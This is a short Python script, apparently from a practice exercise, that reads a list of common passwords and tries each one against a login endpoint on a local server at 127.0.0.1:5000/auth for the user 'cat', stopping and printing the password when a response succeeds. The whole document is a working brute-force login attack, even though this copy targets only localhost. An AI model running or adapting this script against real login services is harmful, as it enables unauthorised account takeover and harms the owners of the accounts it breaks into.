import requests

with open('top_passwords.txt') as passwords_file:
    passwords = passwords_file.readlines()

clean_passwords = [password[:-1] for password in passwords]

for password in clean_passwords:
    print(password)
    response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'cat', 'password': password})

    if response.status_code == 200:
        print('Succes', 'cat', password)
        break
